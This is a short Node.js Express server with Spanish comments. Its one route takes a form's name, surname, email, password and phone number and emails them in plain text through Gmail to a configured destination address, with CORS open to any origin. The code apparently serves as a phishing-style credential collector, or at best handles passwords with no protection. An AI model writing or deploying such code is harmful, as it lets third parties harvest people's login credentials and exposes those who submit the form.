require('dotenv').config();

console.log("EMAIL_USER:", process.env.EMAIL_USER);
console.log("EMAIL_PASS:", process.env.EMAIL_PASS ? "Cargado" : "No cargado");
console.log("EMAIL_DESTINO:", process.env.EMAIL_DESTINO);

require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
app.use(cors());
app.use(bodyParser.json());

// Configurar el transporte de Nodemailer
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
});

// Ruta para recibir datos y enviar el correo
app.post('/enviar-correo', (req, res) => {
    const { nombre, apellido, correo, contrasena, telefono } = req.body;

    const mailOptions = {
        from: process.env.EMAIL_USER,
        to: process.env.EMAIL_DESTINO,
        subject: 'Nuevo formulario recibido',
        text: `Nombre: ${nombre}\nApellido: ${apellido}\nCorreo: ${correo}\nContraseña: ${contrasena}\nTeléfono: ${telefono}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return res.status(500).json({ message: "Error al enviar el correo", error });
        }
        res.json({ message: "Correo enviado con éxito" });
    });
});

// Iniciar servidor en puerto 3000
app.listen(3000, () => {
    console.log('Servidor corriendo en http://localhost:3000');
});
